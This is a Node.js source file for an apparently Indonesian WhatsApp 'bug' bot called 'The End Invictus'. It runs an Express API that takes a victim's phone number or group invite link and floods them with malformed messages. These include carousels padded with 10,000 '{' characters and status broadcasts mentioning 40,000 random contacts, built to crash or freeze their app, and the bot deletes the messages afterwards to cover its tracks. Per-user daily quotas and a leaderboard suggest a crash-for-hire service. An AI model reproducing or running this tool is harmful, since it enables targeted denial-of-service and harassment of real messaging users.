const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const axios = require('axios');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore, jidDecode } = require("@whiskeysockets/baileys");
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const chalk = require("chalk");
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const express = require("express");
const readline = require("readline");
const app = express();
app.use(express.json());
app.use("/", express.static(path.join(__dirname, "lib")));
const cors = require("cors");
app.use(cors());
const sleep = (ms) => new Promise(res => setTimeout(res, ms));

let waSocket = null
const LIMIT_FILE = path.join(__dirname, "limit.json");

function loadLimitData() {
  try {
    return JSON.parse(fs.readFileSync(LIMIT_FILE));
  } catch {
    return {};
  }
}
function saveLimitData(data) {
  fs.writeFileSync(LIMIT_FILE, JSON.stringify(data, null, 2));
}
function resetAllLimit() {
  const data = loadLimitData();
  const today = new Date().toISOString().slice(0, 10);
  for (const user in data) {
    data[user].date = today;
    data[user].count = 0;
  }
  saveLimitData(data);
  console.log("✅ Semua limit berhasil di-reset otomatis");
}
function checkAndUpdateUserLimit(user, target, mode) {
  const now = new Date();
  const date = now.toISOString().slice(0, 10);
  const time = now.toLocaleString("id-ID");
  const data = loadLimitData();
  const max = data[user]?.max || 15;

  if (!data[user] || data[user].date !== date) {
    data[user] = { date, count: 0, max };
  }

  let status, logLine;

  if (data[user].count >= data[user].max) {
    status = `❌ Status : Gagal (${data[user].count}/${data[user].max}) - Limit habis`;
  } else {
    data[user].count += 1;
    status = `✅ Status : Sukses (${data[user].count}/${data[user].max})`;
    saveLimitData(data);
  }

  logLine = `\n[${time}]
🧑 User   : ${user}
🎯 Target : ${target}
🧬 Mode   : ${mode}
⏰ Waktu  : ${time}
${status}\n`;

  fs.appendFileSync("log-limit.txt", logLine);

  return {
    allowed: data[user].count <= data[user].max,
    count: data[user].count,
    max: data[user].max,
    message: status
  };
}
async function SqL(jid, sock, total = 2, batchSize = 1, deleteDelay = 1500) {
  const axios = require("axios");
  const videoRes = await axios.get("https://files.catbox.moe/l4z0d3.mp4", {
    responseType: "arraybuffer"
  });
  const videoBuffer = videoRes.data;
  await sock.refreshMediaConn(true);
  await sleep(100);
  const media = await prepareWAMessageMedia(
    { video: videoBuffer, mimetype: "video/mp4" },
    { upload: sock.waUploadToServer }
  );
  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "TheEnd" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "🩸 ͜͡༑⃟𝐓͙͢͠𝐡𝐞͚͡𝐄͢𝐧͡𝐝͓⍣𝐈͢͠𝐧𝐯͓͡𝐢𝐜͛͢𝐭𝐮͙͡𝐬͚ག⃟°⃟༑꙳🦠",
              body: "🩸 ͜͡༑⃟𝐓͙͢͠𝐡𝐞͚͡𝐄͢𝐧͡𝐝͓⍣𝐈͢͠𝐧𝐯͓͡𝐢𝐜͛͢𝐭𝐮͙͡𝐬͚ག⃟°⃟༑꙳🦠",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://ZalDestroyer.com",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  const cards = [];
  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: { messageParamsJson: "{".repeat(10000) }
    });
  }
    let batchKeys = [];
  for (let i = 0; i < total; i++) {
    const msg = generateWAMessageFromContent(
      jid,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "🩸 ͜͡༑⃟𝐓͙͢͠𝐡𝐞͚͡𝐄͢𝐧͡𝐝͓⍣𝐈͢͠𝐧𝐯͓͡𝐢𝐜͛͢𝐭𝐮͙͡𝐬͚ག⃟°⃟༑꙳🦠" },
              carouselMessage: { cards, messageVersion: 1 },
              contextInfo: {
                businessMessageForwardInfo: {
                  businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                stanzaId: "TheEnd-Id" + Math.floor(Math.random() * 99999),
                forwardingScore: 100,
                isForwarded: true,
                mentionedJid: ["13135550002@s.whatsapp.net"],
                externalAdReply: {
                  title: "🩸 ͜͡༑⃟𝐓͙͢͠𝐡𝐞͚͡𝐄͢𝐧͡𝐝͓⍣𝐈͢͠𝐧𝐯͓͡𝐢𝐜͛͢𝐭𝐮͙͡𝐬͚ག⃟°⃟༑꙳🦠",
                  body: "🩸 ͜͡༑⃟𝐓͙͢͠𝐡𝐞͚͡𝐄͢𝐧͡𝐝͓⍣𝐈͢͠𝐧𝐯͓͡𝐢𝐜͛͢𝐭𝐮͙͡𝐬͚ག⃟°⃟༑꙳🦠",
                  thumbnailUrl: "",
                  mediaType: 1,
                  mediaUrl: "",
                  sourceUrl: "https://ZalDestroyer.com",
                  showAdAttribution: false
                }
              }
            }
          }
        }
      },
      {}
    );
    msg.key.remoteJid = jid;
    msg.key.fromMe = true;

    await sock.relayMessage(jid, msg.message, {
      participant: { jid },
      messageId: msg.key.id
    });
    console.log(`Sending Forclose 🦅`);
    batchKeys.push(msg.key);

    if (batchKeys.length === batchSize) {
      await sleep(deleteDelay);
      await deleteMessages(sock, jid, batchKeys);
      batchKeys = [];
    }
  }

  if (batchKeys.length > 0) {
    await sleep(deleteDelay);
    await deleteMessages(sock, jid, batchKeys);
  }
}
async function deleteMessages(sock, jid, keys) {
  for (const key of keys) {
    const delKey = {
      remoteJid: jid,
      id: key.id,
      fromMe: true
    };
    try {
      await sock.sendMessage(jid, { delete: delKey });
      console.log(`Delete Forclose 🦅`);
    } catch (e) {
      console.error("Gagal Delete Forclose 🦅");
    }
    await sleep(50);
  }
}
async function SqLGc(jid, sock, total = 5, batchSize = 2, deleteDelay = 1000) {
  const videoRes = await axios.get("https://files.catbox.moe/l4z0d3.mp4", {
    responseType: "arraybuffer"
  });
  const videoBuffer = videoRes.data;

  await sock.refreshMediaConn(true);
  await sleep(100);

  const media = await prepareWAMessageMedia(
    { video: videoBuffer, mimetype: "video/mp4" },
    { upload: sock.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "TheEnd-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "Susu 🍼",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Susu 🍼",
              body: "Susu 🍼",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://ZalDestroyer.com",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  const cards = [];
  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: { messageParamsJson: "{".repeat(10000) }
    });
  }

  let batchKeys = [];

  for (let i = 0; i < total; i++) {
    const msg = generateWAMessageFromContent(
      jid,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "Susu 🍼" },
              carouselMessage: { cards, messageVersion: 1 },
              contextInfo: {
                businessMessageForwardInfo: {
                  businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                stanzaId: "TheEnd-Id" + Math.floor(Math.random() * 99999),
                forwardingScore: 100,
                isForwarded: true,
                mentionedJid: ["13135550002@s.whatsapp.net"],
                externalAdReply: {
                  title: "Susu 🍼",
                  body: "Susu 🍼",
                  thumbnailUrl: "",
                  mediaType: 1,
                  mediaUrl: "",
                  sourceUrl: "https://ZalDestroyer.com",
                  showAdAttribution: false
                }
              }
            }
          }
        }
      },
      {}
    );

    msg.key = {
      remoteJid: jid,
      fromMe: true,
      id: generateMessageID(),
      participant: "0@s.whatsapp.net"
    };

    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
    console.log(`Sending Forclose Group 🦅`);    batchKeys.push(msg.key);
    if (batchKeys.length === batchSize) {
      await sleep(deleteDelay);
      await deleteMessages(sock, jid, batchKeys);
      batchKeys = [];
    }
  }

  if (batchKeys.length > 0) {
    await sleep(deleteDelay);
    await deleteMessages(sock, jid, batchKeys);
  }
}

async function deleteMessages(sock, jid, keys) {
  for (const key of keys) {
    const delKey = {
      remoteJid: jid,
      id: key.id,
      fromMe: true,
      participant: "0@s.whatsapp.net"
    };
    try {
      await sock.sendMessage(jid, { delete: delKey });
      console.log(`Delete Pesan Bug 🦅`);
    } catch (e) {
      console.error("❌ Gagal Hapus Pesan Bug Group");
    }
    await sleep(50);
  }
}
function generateMessageID() {
  return (Math.random() * 1e20).toString(36);
}
async function Divine(sock, jid, mention) {
    const mentionedList = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`)
    ];
    const imgUrl = "https://mmg.whatsapp.net/v/t62.7118-24/32712111_749506614240626_1571338893770400961_n.enc?ccb=11-4&oh=01_Q5Aa2AECrERdw8N4nXygP3uCGv3uqC3oRwhnDEuXWtdfVCUA4A&oe=68A29C7F&_nc_sid=5e03e0&mms3=true";
    const mType = "image/jpeg";
    const fileSha = "s0kIQLVw1FkyhgAvD8y+TRkXfPxkttdakdZKneu7Mro=";
    const length = "285488";
    const height = "1280";
    const width = "763";
    const mediakey = "QAplOD67eEe6b9w3TGM8oKXw2BbbydV4xRrKeZ1HC+I=";
    const encSha = "yBs5l1vLoWUT3p/ZkpadRDL8Z2EnR91dsp/a/1z7Uuc=";
    const partDirect = "/v/t62.7118-24/32712111_749506614240626_1571338893770400961_n.enc?ccb=11-4&oh=01_Q5Aa2AECrERdw8N4nXygP3uCGv3uqC3oRwhnDEuXWtdfVCUA4A&oe=68A29C7F&_nc_sid=5e03e0";
    const keyTimestamp = "1752903565";

    const imageMessage = {
  url: imgUrl,
  mimetype: mType,
  caption: "Susu 🍼",
  fileSha256: fileSha,
  fileLength: length,
  height: height,
  width: width,
  mediaKey: mediakey,
  fileEncSha256: encSha,
  directPath: partDirect,
  mediaKeyTimestamp: keyTimestamp,
  jpegThumbnail: "",
  contextInfo: {
    mentionedJid: mentionedList,
    forwardingScore: 999,
    isForwarded: true,
    entryPointConversionSource: "non_contact",
    forwardingScore: 9999,
    groupMentions: [],
  },
  forwardedNewsletterMessageInfo: {
    newsletterJid: "120363321780343289@newsletter",
    serverMessageId: 1000000,
    newsletterName: "Susu 🍼"
  }
};

    const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: { imageMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: jid }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
    console.log(`Sending Delay Invisible 🦅`);
}
async function StartZenn() {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    printQRInTerminal: false,
    auth: state,
    browser: ["Ubuntu", "Chrome", "20.0.04"]
  });
  waSocket = sock;
  const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question(`Silahkan Masukin Nomer Kamu\nNomer Yang Kamu Masukkin : `, async (phoneNumber) => {
  rl.close();
  const cleanNumber = phoneNumber.trim();
  const code = await sock.requestPairingCode(cleanNumber, "ZALLLLLL");
  console.log(`Kode Pairing Kamu: ZALL - LLLL`);
});
  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
      console.log("⚠️ Koneksi Terputus :", reason);
      StartZenn();
    }
    if (connection === "open") {
      console.clear();
      console.log(chalk.red.bold(`
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈    

┌─⊱「 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐓𝐨 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 」⊰─┐
├➣ Name : The End Invictus
├➣ Developer : @ZalOffc
├➣ Version : 1.0
└───────────────────────────────┘`));
    }
  });
  sock.ev.on('creds.update', saveCreds);    
    app.post("/api/bug", async (req, res) => {
  const { target, mode, user } = req.body;
  if (!waSocket) return res.status(500).send("❌ Server Belum Siap");
  if (!target || !mode) return res.status(400).send("❌ Target & Mode wajib diisi.");

  let jid = "";
  try {
    console.log(chalk.blue.bold(`
┌─☉「 𝐓𝐇𝐄 𝐄𝐍𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 」☉─┐
├▢ Username : ${user} 
├▢ Mengirim Bug Ke : ${target}
├▢ Type Bug: ${mode}
└────────────────────────┘`)); 
    if (target.includes("https://chat.whatsapp.com/")) {
      const gcCode = target.split("https://chat.whatsapp.com/")[1].split("?")[0].trim();
      try {
        jid = await waSocket.groupAcceptInvite(gcCode);
        console.log(chalk.blue.bold(`
┌──────────────────────┐
├▢ Bot Berhasil Join Grup:
${jid}
└──────────────────────┘`,));
      } catch (e) {
        console.error(`
┌──────────────────────┐
├▢ Bot Gagal Join Ke Grup : ${jid}
└──────────────────────┘`,);
        return res.status(400).send("❌ Link grup tidak valid atau bot sudah ada di grup.");
      }
    } else if (target.endsWith("@g.us")) {
      jid = target.trim();
      console.log("⪩ Target pakai ID Grup:", jid);
    } else if (/^\d{8,20}$/.test(target)) {
      jid = target.trim() + "@s.whatsapp.net";
    } else {
      return res.status(400).send("❌ Format target tidak dikenali.");
    }
    const limit = checkAndUpdateUserLimit(user || "Anon", target, mode);
if (!limit.allowed) return res.status(403).send(limit.message);
if (mode === "Forclose") {
  for (let i = 0; i < 5; i++) {
    await SqL(jid, waSocket);
  }
} else if (mode === "DelayInvisible") {
      for (let i = 0; i < 10; i++) {
        await Divine(waSocket, jid);
        await sleep(10000);
        await Divine(waSocket, jid);
        await sleep(10000);
        await Divine(waSocket, jid);
      }
    } else if (mode === "BugGrup") {
      for (let i = 0; i < 10; i++) {
        await SqLGc(jid, waSocket);
      }
    } else {
      return res.status(400).send("❌ Mode tidak dikenali.");
    }

    return res.json({
  status: "success",
  message: limit.message,
  target: jid,
  user,
  count: limit.count,
  max: limit.max
});
  } catch (err) {
    console.error("❌ Gagal kirim bug:", err.message);
    return res.status(500).send("❌ Error: " + err.message);
  }
});
  return sock;
}
StartZenn();
app.listen(3000, '0.0.0.0', () => {
  console.log("🌐 Web Aktif Di : https://zaloffc.yubii.my.id:3000/");
});
app.get("/api/ping", (req, res) => {
  const status = JSON.parse(fs.readFileSync("./status.json", "utf8"));
  if (status.online) {
    res.status(200).send("✅ Server Aktif");
  } else {
    res.status(503).send("❌ Server Offline");
  }
});
app.post("/api/ai", async (req, res) => {
  const { message, style } = req.body;

  const promptStyle = {
    ramah: "Jawab dengan bahasa santai, sopan, dan friendly:",
    toxic: "Jawab dengan gaya toxic, nyebelin, tapi masih masuk akal:",
    bocil: "Jawab seperti bocil lebay, suka capslock dan emoji:",
    sarkas: "Jawab dengan nada sarkas, ketus, dan nyelekit:",
    default: "Jawab layaknya AI assistant yang membantu:"
  };

  const systemPrompt = promptStyle[style] || promptStyle.default;

  try {
    const response = await axios.post('https://localhost:11434/api/generate', {
      model: "tinyllama",
      prompt: `${systemPrompt} ${message}`,
      stream: false
    });

    const output = response.data.response.trim();
    res.json({ success: true, response: output });
  } catch (err) {
    console.error("❌ Error AI:", err.message);
    res.status(500).json({ success: false, error: "Gagal mendapatkan respon AI." });
  }
});
app.get("/api/limit", (req, res) => {
  const user = req.query.user;
  if (!user) return res.status(400).json({ error: "User tidak ditemukan" });
  const today = new Date().toISOString().slice(0, 10);
  const data = loadLimitData();
  const userData = data[user] || { date: today, count: 0, max: 10 };
  const allowed = userData.count < userData.max;
  const ranking = Object.entries(data)
    .filter(([_, u]) => u.date === today)
    .sort((a, b) => b[1].count - a[1].count)
    .map(([name, info]) => ({
      user: name,
      count: info.count,
      max: info.max
    }));
  return res.json({
    allowed,
    count: userData.count,
    max: userData.max,
    rank: ranking
  });
});
setInterval(() => {
  const now = new Date();
  const jam = now.getHours();
  const menit = now.getMinutes();

  // Kalau jam 00:00 tepat
  if (jam === 0 && menit === 0) {
    resetAllLimit();
  }
}, 60 * 1000); // setiap 1 menit
